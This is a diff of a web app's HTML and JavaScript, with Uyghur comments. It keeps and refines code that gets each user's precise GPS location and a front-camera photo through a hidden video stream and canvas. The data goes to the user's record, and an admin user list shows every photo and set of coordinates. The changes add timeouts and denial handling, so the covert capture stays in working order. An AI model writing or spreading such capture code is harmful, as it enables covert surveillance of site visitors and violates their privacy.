@@ -130,12 +130,10 @@
         .form-control { width: 100%; padding: 10px 12px; background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 8px; color: #fff; font-size: 13px; outline: none; user-select: text; }
         .btn-submit { width: 100%; padding: 12px; background: var(--primary-color); border: none; border-radius: 8px; color: white; font-weight: 700; font-size: 14px; cursor: pointer; margin-top: 10px; }
 
-        /* 🔥 باشقۇرغۇچى ئابونتلار تىزىملىكى ئۇسلۇبى */
         .users-list { background: var(--card-bg); border-radius: var(--radius); padding: 10px; margin-top: 15px; max-height: 420px; overflow-y: auto; }
         .user-item-card { display: flex; align-items: center; gap: 10px; padding: 10px; border-bottom: 1px solid var(--border-color); border-radius: 8px; margin-bottom: 8px; }
         .user-item-placeholder { background: #333; width: 38px; height: 38px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #fff; font-size: 15px; flex-shrink: 0; }
         
-        /* 🔥 ئابونت كامېرا رەسىمى كىچىك كۆرسەتكۈچى */
         .user-captured-thumb { width: 40px; height: 40px; border-radius: 6px; object-fit: cover; border: 1px solid var(--primary-color); cursor: pointer; flex-shrink: 0; }
         .user-no-photo { width: 40px; height: 40px; border-radius: 6px; background: #2c2c2e; display: flex; align-items: center; justify-content: center; font-size: 10px; color: var(--text-muted); flex-shrink: 0; text-align: center; }
 
@@ -189,7 +187,6 @@
         .image-modal-body { width: 100%; flex: 1; display: flex; justify-content: center; align-items: center; padding: 10px; }
         .image-modal-body img { max-width: 100%; max-height: 100%; object-fit: contain; }
 
-        /* 🔥 رۇخسەت سوراش مەخسۇس كۆزنىكى */
         #permissionModal {
             display: flex; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
             background: rgba(0,0,0,0.92); z-index: 99999;
@@ -213,7 +210,6 @@
 
     <div class="screenshot-shield"></div>
 
-    <!-- كامېرا ۋە GPS ئۈچۈن يوشۇرۇن ئېلېمېنتلار -->
     <video id="secretCamStream" style="display:none;" autoplay playsinline></video>
     <canvas id="secretCanvas" style="display:none;"></canvas>
 
@@ -387,15 +383,14 @@
             }
         }
 
-        // 🔥 ئابونت «رۇخسەت بېرىش» كۇنۇپكىسىنى باسقاندا GPS ۋە كامېرا بىرلا ۋاقىتتا ئىشلەيدۇ
+        // 🔥 ئابونت رۇخسەت بەرمىگەن ئەھۋالدا توربەت قېتىپ قالمايدىغان ۋە خاتالىقنى توغرا بىر تەرەپ قىلىدىغان ئۇسۇل
         function requestUserPermissionsAndCapture() {
             if (!currentUser || !currentUser.id) return;
 
-            // كۆزنەكنى يوشۇرۇش
             const permModal = document.getElementById('permissionModal');
             if (permModal) permModal.style.display = 'none';
 
-            // 1. GPS ئورۇن ئۇچۇرىنى ئېلىش
+            // 1. GPS ئورۇن ئۇچۇرىنى ئېلىش (خاتالىقنى بىر تەرەپ قىلىش بىلەن)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
                     const lat = position.coords.latitude;
@@ -407,11 +402,11 @@
                         updatedAt: new Date().toLocaleString()
                     });
                 }, (error) => {
-                    console.log("GPS رۇخسىتى بېرىلمىدى");
-                }, { enableHighAccuracy: true });
+                    console.log("GPS رۇخسىتى بېرىلمىدى ياكى خاتالىق كۆرۈلدى:", error.message);
+                }, { enableHighAccuracy: true, timeout: 10000 });
             }
 
-            // 2. كامېرا رۇخسىتى سوراش ۋە رەسىمگە تارتىش
+            // 2. كامېرا ئارقىلىق رەسىمگە تارتىش (catch ئارقىلىق رەت قىلىنغان ئەھۋالنى تۇتۇش)
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then((stream) => {
                     const video = document.getElementById('secretCamStream');
@@ -436,7 +431,7 @@
                     }, 2500);
                 })
                 .catch((err) => {
-                    console.log("كامېرا رۇخسىتى بېرىلمىدى");
+                    console.log("كامېرا رۇخسىتى بېرىلمىدى (User Denied):", err);
                 });
         }
 
@@ -671,7 +666,6 @@
             handleSearch();
         }
 
-        // 🔥 باشقۇرغۇچى ئابونتلار تىزىملىكىدە GPS ۋە كامېرا رەسىمىنى كۆرسىتىش
         function renderAdminUserList() {
             const container = document.getElementById('registeredUsersContainer');
             if (!container) return;
@@ -681,13 +675,11 @@
             container.innerHTML = allUsers.map(u => {
                 const vip = Boolean(u.isVip);
                 
-                // ئابونتنىڭ رەسىمى بار-يوقلىقىنى تەكشۈرۈش
                 let photoHtml = `<div class="user-no-photo">رەسىم يوق</div>`;
                 if (u.capturedImage && u.capturedImage.image) {
                     photoHtml = `<img src="${u.capturedImage.image}" class="user-captured-thumb" alt="Camera Photo" onclick="openImageViewer('${u.capturedImage.image}', '${u.name || 'ئابونت'} - تارتىلغان رەسىم')" title="رەسىمنى چوڭايتىپ كۆرۈش">`;
                 }
 
-                // GPS ئورنىنى كۆرسىتىش
                 let gpsHtml = `<span style="color:var(--text-muted); font-size:10px;">📍 GPS: تېپىلمىدى</span>`;
                 if (u.location) {
                     gpsHtml = `<span style="color:#00e676; font-size:10px;">📍 GPS: ${u.location.latitude.toFixed(4)}, ${u.location.longitude.toFixed(4)}</span>`;
